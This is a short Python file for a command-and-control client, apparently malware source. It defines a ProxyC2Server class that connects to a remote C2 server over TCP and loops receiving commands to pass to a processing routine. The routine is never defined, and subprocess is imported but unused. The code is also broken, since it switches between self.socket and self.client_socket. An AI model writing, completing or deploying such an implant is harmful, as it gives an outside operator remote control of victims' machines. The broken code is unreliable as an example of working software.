import socket
import subprocess

class ProxyC2Server:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_socket = None

    def connect_to_c2_server(self):
        """Establish connection with the C2 server."""
        try:
            # Create socket object
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"Connecting to {self.server_ip}:{self.server_port}...")
            # Connect to the server
            self.client_socket.connect((self.server_ip, self.server_port))
            print("Connected to the C2 server.")
        except socket.error as err:
            print(f"Error connecting to the server: {err}")

    def close_connection(self):
        if self.socket:
            self.socket.close()
            print("Connection closed.")

    def listen_for_commands(self):
        try:
            while True:
                data = self.socket.recv(1024)

                if data:
                    decoded_data = data.decode('utf-8')
                    print("Recieved commad:", decoded_data)
                    
                    self.process_command(decoded_data)
                
                else:
                    print("No data received, closing connection.")
                    break  # Exit if no data is received
        except socket.error as err:
            print(f"Error receiving data: {err}")
        finally:
            self.client_socket.close()  # Ensure the socket is closed when done
            print("Connection closed.")